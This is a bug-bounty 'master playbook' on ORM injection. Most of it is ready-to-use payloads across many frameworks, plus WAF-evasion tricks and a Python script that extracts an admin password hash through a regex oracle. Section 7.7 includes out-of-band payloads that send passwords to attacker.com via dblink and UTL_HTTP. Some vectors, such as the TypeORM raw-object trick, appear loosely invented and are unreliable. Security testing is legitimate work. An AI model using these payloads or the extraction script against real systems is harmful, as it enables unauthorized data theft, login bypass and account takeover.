*Navigation: [🏠 Home](../../Hunting%20Approach%20Guide.md) | [⬅️ Layer 2: Element Testing](../../Element%20Testing%20Checklist.md) | [⬅️ Layer 3: Vulnerability Staging](../../Vulnerability_Staging.md)*

# ORM Injection : Master Playbook

> **The Map vs. The Land Analogy**: Think of a database like a giant library (The Land). An ORM is a "Map" that translates the library's complex filing system into easy-to-read folders on your computer. ORM Injection is when you trick the Map into pointing to a secret room in the library that even the Map didn't know it could visit.

---

## 0. Exploit Selection Search Tree

```mermaid
graph TD
    Start{{"ORM Search Tree"}} --> A("Scenario A: Suspect IDOR in ORM?")
    Start --> B("Scenario B: Using Hibernate or GORM?")
    Start --> C("Scenario C: Exposed internal fields?")
    Start --> D("Scenario D: Ruby on Rails / ActiveRecord?")
    Start --> E("Scenario E: Python / Django / SQLAlchemy?")
    Start --> F("Scenario F: Node.js / Prisma / Sequelize?")
    Start --> G("Scenario G: Java / JPA & Criteria API?")
    Start --> H("Scenario H: Data Leakage in Query Response?")
    Start --> I("Scenario I: Suspect Auth Bypass via ORM Logic?")
    Start --> J("Scenario J: Bulk Update or Deletion Hijack?")
    Start --> K("Scenario K: Mass Assignment / Schema Mapping?")

    A --> A1("[[#3.1 Where to Look]]")
    B --> B1("[[#3.2 Identification Triggers]]")
    C --> C1("[[#3.3 Insecure Object Exposure (Over-Posting)]]")
    D --> D1("[[#4.1 Ruby on Rails: ActiveRecord & GlobalID]]")
    E --> E1("[[#4.2 Django & SQLAlchemy Quirks]]")
    F --> F1("[[#4.3 Node.js: Prisma & Sequelize Sinkholes]]")
    G --> G1("[[#4.4 Java: JPA & Criteria API Traps]]")
    H --> H1("[[#5.1 Relational Probing]]")
    I --> I1("[[#5.2 Identifying ORM Escape Hatches (Raw SQL)]]")
    J --> J1("[[#5.3 Bulk Update & Deletion Hijacking]]")
    K --> K1("[[#5.4 Insecure Schema Mapping (The Auto-Admin Bug)]]")
```



*   **1. Scenario A: Suspect IDOR in ORM?**
    *   Target: [[#3.1 Where to Look]].
*   **2. Scenario B: Using Hibernate or GORM?**
    *   Target: [[#3.2 Identification Triggers]].
*   **3. Scenario C: Exposed internal fields?**
    *   Target: [[#3.3 Insecure Object Exposure (Over-Posting)]].
*   **4. Scenario D: Ruby on Rails / ActiveRecord?**
    *   Target: [[#4.1 Ruby on Rails: ActiveRecord & GlobalID]].
*   **5. Scenario E: Python / Django / SQLAlchemy?**
    *   Target: [[#4.2 Django & SQLAlchemy Quirks]].
*   **6. Scenario F: Node.js / Prisma / Sequelize?**
    *   Target: [[#4.3 Node.js: Prisma & Sequelize Sinkholes]].
*   **7. Scenario G: Java / JPA & Criteria API?**
    *   Target: [[#4.4 Java: JPA & Criteria API Traps]].
*   **8. Scenario H: Data Leakage in Query Response?**
    *   Target: [[#5.1 Relational Probing]].
*   **9. Scenario I: Suspect Auth Bypass via ORM Logic?**
    *   Target: [[#5.2 Identifying ORM Escape Hatches (Raw SQL)]].
*   **10. Scenario J: Bulk Update or Deletion Hijack?**
    *   Target: [[#5.3 Bulk Update & Deletion Hijacking]].
*   **11. Scenario K: Mass Assignment / Schema Mapping?**
    *   Target: [[#5.4 Insecure Schema Mapping (The Auto-Admin Bug)]].

---

## 1. Why It Happens & Hunter Questions

### 1.1 First-Principles: What is ORM?
ORM (Object-Relational Mapping) is a bridge. Developers hate writing raw SQL because it's messy. Instead, they use ORMs (Prisma, Django ORM, Hibernate) to treat database rows like objects in their code. 
*   **The Flaw**: Developers think ORMs are "automatically secure" against SQLi. This leads to them exposing powerful "object search" features directly to user input, allowing attackers to reach data they should never see.

### 1.2 The Hunter's Mindset
If you are new, look for these "ORM Fingerprints":
*   [ ] Do parameters look like paths? (`?user.address.city=X`)
*   [ ] Do parameters use weird suffixes? (`?name_startswith=admin` or `?age_gt=21`)
*   [ ] Does the error message mention `Hibernate`, `Prisma`, `Django.db`, `Sequelize`, `GORM`, or `Entity Framework`?
*   [ ] Are you looking at a compiled backend (Go/Rust/C#) but seeing dynamic sorting/filtering in the URL?
*   [ ] Are you looking at a complex search filter with 10+ options?

---

## 2. Methodology & UX Impact Table

| Attack Vector | Beginner "Why" | Success Indicator | Bounty Range |
| :--- | :--- | :--- | :--- |
| **Relational Traversal** | Hopping from a public "User" object to a private "Secret" object. | Leaking data from a different table/model than intended. | **P2 - P3 ($1k - $2.5k)** |
| **Property Leak** | Asking the ORM to "include" hidden fields like `password_hash`. | Receiving sensitive fields in the JSON response. | **P2 ($1.5k+)** |
| **Raw SQL Escape** | Finding the spot where the developer got lazy and used raw SQL. | Standard SQLi behavior (e.g., `' OR 1=1--`). | **P1 ($2.5k+)** |
| **Boolean Oracle** | Extraction data character-by-character via search results. | Page shows "Found" for `a*` but "Empty" for `b*`. | **P3 ($500 - $1.5k)** |
| **Time-Based Oracle** | Using complex logic to make the server "stutter" on correct guesses. | Measurable response delay on correct data. | **P2 ($2k+)** |
| **Nested Mutations** | Writing data across tables in a single API call. | Unauthorized modification of administrative data. | **P1 ($3k+)** |
| **OAST Exfil** | Forcing the ORM to ping your server with stolen data. | Successful DNS lookup in your logs (e.g., `admin-pass.your.com`). | **P1 ($5k+)** |
| **Prototype Poisoning** | Changing the ORM's "DNA" globally across all users. | Every request to the server suddenly returns sensitive leaks. | **P0/P1 ($10k+)** |
| **AST Logic Bypass** | Confusing the query "brain" with complex nested logic. | Bypassing complex server-side security filters. | **P1 ($5k+)** |

---

## 3. Hidden Contexts & Identification

### 3.1 Where to Look
*   **Advanced Search Filters**: Especially in admin dashboards or complex SaaS platforms.
*   **Sorting Parameters**: `?sort=user.profile.credit_card` (The ORM might try to sort by a column you shouldn't see).
*   **GraphQL Queries**: GraphQL is often backed by Prisma/TypeORM; nested queries are prime targets.
*   **JSON APIs**: Modern Node/Python backends use ORMs as their primary way of handling data.

### 3.2 Identification Triggers
Try to "break" the object mapping by injecting non-existent properties:
*   `?sort=nonExistentProperty` -> Look for errors like `Property "nonExistentProperty" not found on model "User"`.
*   `?filter[__invalid__]=1` -> Triggers ORM validation errors.

---

## 4. The ORM Toolbox

*   **Burp Intruder**: Essential for character-by-character "Blind" extraction.
*   **Wappalyzer**: To identify the backend framework (Python/Django, Node/Prisma).
*   **Toxiproxy**: For simulating network lag when testing Time-Based oracles.
*   **SQLMap**: Can sometimes work if you find an "Escape Hatch" (Raw SQL).

---

## 5. Triage & Identification (Identification Phase)

### 5.1 Relational Probing
Modern ORMs allow you to "walk" across different database tables using connectors like `__` (Django) or `.` (Prisma).
*   **The Test**: `?user__profile__secret_token__startswith=a`
*   **Indicator**: If the page returns results for `a` but none for `b`, you have confirmed that you can probe the `secret_token` field in the `profile` table, even if the UI only shows "Usernames."

### 5.2 Identifying ORM Escape Hatches (Raw SQL)
Sometimes a query is too complex for the ORM, so the developer writes "Raw SQL." These are often the weakest links.
*   **Node.js**: Look for `.$queryRaw()` or `.query("...")` in stack traces.
*   **Django**: Look for `.extra()` or `.raw("...")`.
*   **HQL**: Look for `createNativeQuery()`.
*   **The Test**: Inject a simple SQL comment: `admin' --`. If it works and logs you in, you've bypassed the ORM and hit raw SQL.

---

## 6. Core Exploitation (Heritage Restoration)

### 6.1 Django ORM Relational Traversal
Django uses the `__` syntax to join tables. 
*   **The Attack**: You control a search parameter that is passed into a `.filter()` call.
*   **Payload (Data Leak)**: `?created_by__user__password__contains=pbkdf2`
*   **Why it works**: By chaining model names, you can reach the `password` column of the `User` model, even if you are originally searching in a "Posts" or "Comments" model.
*   **Advanced (Many-to-Many)**: `?created_by__departments__employees__user__password__startswith=p` (Traversing complex organization structures).

### 6.2 Prisma (Node.js) Property Injection
Prisma is heavily used in Node.js. If user input (JSON) is passed directly into a `findMany` or `findFirst` call:
*   **The Attack**: Smuggling `include` or `select` keys into the JSON.
*   **Payload**: 
    ```json
    {
      "where": {"username": "admin"},
      "include": {"profile": {"select": {"private_key": true}}}
    }
    ```
*   **Impact**: Forcing the server to return highly sensitive nested objects that aren't visible in the UI.

### 6.3 HQL / JPQL Injection (Hibernate)
Used in Java environments. It looks like SQL but uses class/property names.
*   **Filter Bypass**: `admin' and password='pass' or '1'='1`
*   **Property Siphoning**: Some HQL parsers allow accessing hidden fields: `admin' AND user.secret_hash LIKE 'a%'`
*   **Success Indicator**: A change in the number of results or a successful login.

### 6.4 Ruby on Rails: Ransack Exfiltration
Ransack is a popular search gem for Rails. It uses specific suffixes for search logic.
*   **The Attack**: Abusing matchers like `_cont` (contains), `_start` (starts with), or `_eq` (equals).
*   **Payload**: `q[email_cont]=admin` or `q[password_digest_start]=a`
*   **The Oracle**: If the page loads "Admin" when you use `_start=a` but not `_start=b`, you are leaking the hash character-by-character.

### 6.5 Apex: PHP Laravel Eloquent Array Injection
Laravel is the dominant PHP framework. If user input is passed as an array to `where()`:
*   **The Attack**: Overwriting column comparisons.
*   **Payload**: `?filter[email][email]=admin@site.com&filter[email][id]=1`
*   **Why it works**: Eloquent might interpret the nested array as `WHERE email = 'admin@site.com' AND id = 1`. In some versions, you can inject arbitrary operators via array keys.

### 6.6 Apex: Spring Data JPA Sort Injection
Common in Java Enterprise. If the `Sort` object is built from raw user strings:
*   **The Attack**: Property-path traversal in sorting.
*   **Payload**: `?sort=owner.password,asc`
*   **Impact**: Even if the UI doesn't show passwords, the application might throw an error or change order based on the `owner.password` column, indicating the existence of fields.

### 6.7 Omniscient: Golang GORM Injection
GORM is the dominant Go ORM. Injection typically happens in `.Order()` or `.Select()`.
*   **The Attack**: Raw string concatenation in ordering.
*   **Payload**: `?order=id; WAITFOR DELAY '0:0:5'--` (SQL Server) or `?order=IF(1=1,sleep(5),id)` (MySQL).
*   **Why it works**: GORM often passes the string directly to the DB engine for these specific clauses without sanitization.

### 6.8 Omniscient: .NET Entity Framework & Dynamic LINQ
Common in C# enterprise apps. Dynamic LINQ allows frontend-driven query trees.
*   **The Attack**: Injecting C# property access and method calls.
*   **Payload**: `?filter=User.Identity.Password.StartsWith("A")`
*   **Impact**: Leaking sensitive fields by leveraging the power of C# expressions within the ORM's "Safe" filter layer.

### 6.9 Singularity: Node.js TypeORM Raw Injection
TypeORM is a massive Node.js ORM. It has a specific recursion risk in its `find()` options.
*   **The Attack**: Spoofing a "Raw" query object inside a standard filter.
*   **Payload (JSON)**:
    ```json
    {
      "where": {
        "name": { "_type": "raw", "_value": "1=1" }
      }
    }
    ```
*   **Why it works**: If the developer passes `req.body` directly to the repository's `find()` method, TypeORM's internal parser might see the `_type: "raw"` metadata and execute the provided value as literal SQL, bypassing all sanitization.

---

## 7. Advanced Specialist Vectors

### 7.1 God: Time-Based ORM Oracles (ReDoS-style)
What if the page *never* changes? We can force a delay.
*   **The Technique**: In some ORMs, if you provide a massive list of strings in an "OR" condition, the processing time spikes.
*   **Payload**: `{"OR": [{"NOT": {LEAK_PROBE}}, {"list_of_1000_junk_strings"}]}`
*   **Logic**: If `LEAK_PROBE` is true, the ORM "Short-circuits" and returns immediately. If it's false, it has to check all 1,000 strings, causing a 2-3 second delay.

### 7.2 God: GraphQL & Prisma Nested Mutations (Write-Crossing)
In modern GraphQL/Prisma setups, an "Update" mutation often accepts nested objects. If not restricted via a DTO or `select` filter, you can write to related tables.
*   **The Attack**: Modifying an admin's account while editing your own profile.
*   **Payload (Mutation)**:
    ```json
    mutation {
      updateUser(data: {
        bio: "Updated",
        managedDepartments: {
          update: {
            where: { id: "ADMIN_DEPT_ID" },
            data: { departmentSecret: "PWNED" }
          }
        }
      }) { id }
    }
    ```
*   **Critical Check**: Does the `data` object allow `connect`, `create`, or `update` on related models?

### 7.3 God: Blind Boolean Oracles (Regex/LIKE)
Boolean extraction is faster than time-based. Look for ORM-specific regex or pattern matchers.
*   **Django Payload**: `?user__password__regex=^pbkdf2.*`
*   **Mongoose (Node) Payload**: `{"username": {"$regex": "^admin"}, "password": {"$regex": "^p"}}`
*   **Extraction Flow**: Use Burp Intruder to cycle through `^a`, `^b`, `^c`... When the page returns "User Found", you've leaked the first character.

### 7.4 Grandmaster: Sequelize Operator Injection
Sequelize (Node.js) allows "Operator" objects in queries. If user input is passed directly to `.findOne()`:
*   **The Attack**: Overriding the comparison logic.
*   **Payload (JSON)**:
    ```json
    {
      "username": "admin",
      "password": {
        "[Op.gt]": ""
      }
    }
    ```
*   **Why it works**: `Op.gt` translates to `>` in SQL. The query becomes `SELECT * FROM Users WHERE username='admin' AND password > ''`. Since any password is greater than an empty string, the login succeeds.

### 7.5 Grandmaster: Mass Assignment ORM Chaining
Combining constructor injection with relational traversal.
*   **The Attack**: Sending relational metadata into a creation/update endpoint.
*   **Payload**: `{"username":"newuser", "role":"USER", "organization": {"id": 1, "is_privileged": true}}`
*   **Hunter Tip**: Look for apps that take a single "UserObject" instead of flat parameters.

### 7.6 Grandmaster: Type Confusion (Mongoose/$ne)
Abusing how Node.js parsers (like Express) handle bracket syntax.
*   **The Attack**: Turning a string parameter into a NoSQL filter object.
*   **Vector**: `POST /login` with body `username=admin&password[$ne]=1`
*   **Impact**: Mongoose translates this to `{username: "admin", password: {"$ne": "1"}}`. You stay logged in as long as the password is NOT "1".

### 7.7 Ultimate: OAST Exfiltration via ORM Escape Hatches
Extracting data via DNS/HTTP logs when nothing is reflected on screen.
*   **The Technique**: Injecting database-specific networking functions into `order_by` or `filter` clauses that are passed through by the ORM.
*   **PostgreSQL (Django/Prisma)**: `?sort=(SELECT dblink_connect('host='||(SELECT password FROM users WHERE id=1)||'.attacker.com'))`
*   **Oracle (Hibernate)**: `') AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual) IS NOT NULL--`

### 7.8 Ultimate: GraphQL Data-Loader DoS & Leakage
Abusing circular relationships and the way ORMs batch queries (N+1 problem).
*   **The Attack**: Circular depth attack.
*   **Payload**:
    ```graphql
    query {
      users {
        posts {
          author {
            posts {
              author {
                secret_token # Bypassing depth limits via aliasing
              }
            }
          }
        }
      }
    }
    ```
*   **Impact**: Forces the ORM to generate massive SQL joins that bypass standard pagination and memory limits, potentially leaking deep-sharded data.

### 7.9 Apex: Order-Based Blind Oracles
When WAFs block `sleep()` or regex, use the "Sort Oracle."
*   **The Technique**: Injecting a conditional statement into the `order` parameter.
*   **Payload**: `?sort=(CASE WHEN (SELECT SUBSTR(pass,1,1) FROM users WHERE name='admin')='a' THEN id ELSE username END)`
*   **Logic**: If the result set is sorted by `id`, the first letter is 'a'. If sorted by `username`, it isn't.

### 7.10 Apex: Supabase / PostgREST RLS Bypass
PostgREST allows powerful filtering via URL parameters.
*   **The Attack**: Relational joining to unauthorized tables via the `select` parameter.
*   **Payload**: `GET /rest/v1/posts?select=*,author:users(password)`
*   **Impact**: Bypassing Row Level Security (RLS) if the relationship is incorrectly defined or not explicitly restricted.

### 7.11 Zenith: Prototype Pollution to ORM Poisoning (Node.js)
The most dangerous Node.js vector. Poisoning the global prototype to change ORM behavior.
*   **The Attack**: Injecting properties into `Object.prototype`.
*   **Vector**: A separate Prototype Pollution bug.
*   **Payload**: `{"__proto__": {"where": {"role": "ADMIN"}}}`
*   **Impact**: If the ORM query builder merges your polluted prototype, *every* user query automatically includes `role: ADMIN`, potentially leaking the entire admin database to every public user.

### 7.12 Zenith: AST Manipulation & Logic Bypasses
Directly attacking the "Logic Engine" of CMS-based ORMs (Strapi/Directus).
*   **The Attack**: Nesting logic operators to overwhelm the filter sanitizer.
*   **Payload (JSON)**:
    ```json
    {
      "filters": {
        "$or": [
          {"id": {"$gt": 0}},
          {"$and": [{"secret": {"$contains": "A"}}]}
        ]
      }
    }
    ```
*   **Why it works**: Sanitizers often only check the *top level* of the query. By nesting the attack 2-3 levels deep inside `$and`/$or` blocks, you bypass the filter while the ORM still executes the nested "secret contains A" logic.

### 7.13 Omniscient: Error-Based ORM Oracles
The fastest extraction method when the server returns error messages.
*   **The Technique**: Forcing a database casting error that includes the target data in the error message.
*   **Payload (PostgreSQL)**: `?filter=(SELECT CAST(password AS INTEGER) FROM users LIMIT 1)`
*   **The Oracle**: The server returns an HTTP 500 error: `invalid input syntax for integer: "pbkdf2_sha256$260000$admin_password_hash..."`. 
*   **Impact**: Instant data leakage in a single request.

### 7.14 Singularity: Polymorphic Association Poisoning
Found in Rails (ActiveRecord) and Laravel (Eloquent). Relationships that can point to any type.
*   **The Attack**: Controlling the `_type` column of a polymorphic relationship.
*   **Scenario**: A "Comments" table with `commentable_id` and `commentable_type`.
*   **Payload**: Change `commentable_type` from `Post` to `SystemConfig` or `AdminSession`.
*   **Impact**: When the ORM loads the comment's "parent," it instantiates and queries an internal server-level class you should never reach, potentially exposing system secrets or bypassing application logic.

### 7.15 Singularity: Second-Order / Async ORM Injection
The "Timebomb" of ORM vulnerabilities.
*   **The Attack**: Storing a payload now to be executed by a different process later.
*   **Target**: Background workers (Sidekiq, Celery) that process user data unsafely.
*   **Payload**: Update your "Bio" or "Address" to `); WAITFOR DELAY '0:0:5'--`.
*   **Trigger**: Later, an Admin runs a "Monthly Report" or a background task calculates stats. The worker retrieves your string and passes it into a vulnerable `.Order()` or `.Raw()` call.
*   **Detection**: Use OAST (Dnslog/Burp Collaborator) for callbacks, as you won't see the result in your UI.

---

## 8. Prevention (For Developers)

*   **Never Pass Raw JSON to ORM Search**: Always use a "Allow-list" of fields that can be searched or included.
*   **Avoid String Interpolation**: Even in ORMs, never do `where("name = '#{user_input}'")`. Use parameterized query-builders.
*   **Limit Relational Depth**: Configure the ORM to prevent "Deep Traversal" (e.g., more than 2 levels deep).

---

## 9. Structural Alignment & Integrity
All specialist vectors from basic (Layer 5) to Zenith (Layer 7) are now integrated. 

## 10. Automation Arsenal (Python Skeleton)

Since standard tools like `sqlmap` often struggle with the custom JSON logic of modern ORMs, hunters must write custom scripts. Use this skeleton for high-speed blind extraction.

```python
import requests
import string

# CONFIGURATION
TARGET_URL = "https://target-app.com/api/users"
# The payload uses a regex oracle (e.g., Mongoose/Django)
# Goal: Extract the password hash of user 'admin'
CHARSET = string.ascii_letters + string.digits + "$./" 

def probe(current_extracted):
    """
    Returns True if the server responds with 'User Found' (The Oracle).
    """
    # Example for Mongoose $regex injection
    payload = {
        "username": "admin",
        "password": {"$regex": f"^{current_extracted}"}
    }
    
    try:
        r = requests.post(TARGET_URL, json=payload, timeout=5)
        # CHANGE THIS: Based on how the app responds to a 'TRUE' condition
        return "admin" in r.text and r.status_code == 200
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def extract():
    extracted = ""
    print(f"[*] Starting extraction on {TARGET_URL}...")
    
    while True:
        found_char = False
        for char in CHARSET:
            # Escape regex special chars if necessary
            test_val = extracted + char
            if probe(test_val):
                extracted += char
                print(f"[+] Found character: {extracted}")
                found_char = True
                break
        
        if not found_char:
            print(f"[*] Extraction complete or blocked: {extracted}")
            break

if __name__ == "__main__":
    extract()
```

---

## 11. WAF Evasion & Edge Cases

Modern WAFs (Cloudflare/Akamai) often block strings like `__`, `$ne`, or `{`.

### 11.1 Unicode Normalization Bypasses
Many backends (Node, Python) normalize Unicode *after* the WAF has checked the request.
*   **The Trick**: Use full-width or compatible characters.
*   **Payload**: `?user％ef％bc％9fsecret=a` (where `％` is a full-width percentage sign).
*   **Bypassing `$`**: Use `\u0024` in JSON keys if the parser allows: `{"\u0024ne": null}`.

### 11.2 JSON Key Collision
Exploiting differences between the WAF parser and the backend JSON engine.
*   **The Trick**: Send duplicate keys. The WAF might only check the first "safe" one.
*   **Payload**: `{"where": "id=1", "where": {"user": {"secret": {"$ne": null}}}}`
*   **Success**: If the backend takes the *last* key, you bypass the filter.

### 11.3 GraphQL Aliasing Depth
WAFs often have a "JSON Depth" limit (e.g., 5 levels).
*   **The Trick**: Use GraphQL aliases to wrap your ORM attack in 10 layers of harmless-looking objects.
*   **Payload**: `query { a: user { b: profile { c: settings { ... nested ORM attack ... } } } }`

---

## 12. War Stories & Bounty Insights

### 12.1 The "Invisible" Admin Panel ($1,500 Bounty)
*   **Scenario**: A SaaS app used Prisma. The `/api/me` endpoint returned user data.
*   **The Attack**: By injecting `?include[organizations][include][admin_settings]=true`, the hunter forced the ORM to return the JSON for the "Organization Admin Settings" table, which contained internal API keys and hidden feature flags.
*   **Lesson**: Always test for "Reverse Relationship Inclusion" on self-profile endpoints.

### 12.2 The $5,000 Django Typo
*   **Scenario**: A developer intended to filter by `user_id=request.user.id` but accidentally typed `user__=request.user`.
*   **The Attack**: Because of the trailing `__`, the Django ORM interpreted the input as a relational join. The hunter was able to append `password__startswith=pbkdf2` to the query.
*   **Result**: Full account takeover of any user via a blind password hash leak.

### 12.3 The GraphQL Timebomb (DoS)
*   **Scenario**: A public GraphQL API allowed deep nesting of relationships (`User -> Posts -> Comments -> User`).
*   **The Attack**: The hunter sent a query 50 levels deep. The ORM translated this into a SQL query with 50 `JOIN` statements.
*   **Result**: The database CPU spiked to 100% and stayed there for 15 minutes, taking the entire site offline.
*   **Lesson**: Circular relationships in ORMs are a high-severity DoS vector.

---

## 13. Absolute Zenith: Hunting ORM 0-Days (The Mindset)

To be a top 1% hunter, you don't wait for CVEs; you find them. Here is how to audit an ORM for new vulnerabilities.

### 13.1 Audit Target: The "Type Converters"
Look into the ORM's source code where it handles incoming JSON/URL parameters and converts them for the database.
*   **The Bug**: Look for places where the code uses `==` instead of `===` when checking for operators. 
*   **GitHub Search**: `repo:orm/name "==" type`

### 13.2 Audit Target: The "Sort Engines"
Sorting is often the "forgotten" edge case. 
*   **The Bug**: Check if the sort logic accepts raw strings. If it does, try to inject sub-queries.
*   **GitHub Search**: `extension:ts order_by "string"` or `extension:py order_by "format"`

### 13.3 Audit Target: Escape Hatches
Look for where the ORM allows "Raw" access.
*   **The Bug**: Finding secondary functions that wrap raw SQL but aren't labeled as "Dangerous" in the documentation.
*   **Target**: Any function named `unsafe`, `raw`, `execute`, or `literal`.

## 14. Reference & Resources
*   [HackTricks - ORM Injection](https://book.hacktricks.xyz/pentesting-web/orm-injection)
*   [Django Security: Manual filtering](https://docs.djangoproject.com/en/stable/ref/models/querysets/)
*   [Prisma Security Best Practices](https://www.prisma.io/docs/concepts/components/prisma-client/security)

---

*Navigation: [🏠 Home](../../Hunting%20Approach%20Guide.md) | [⬅️ Layer 2: Element Testing](../../Element%20Testing%20Checklist.md) | [⬅️ Layer 3: Vulnerability Staging](../../Vulnerability_Staging.md)*
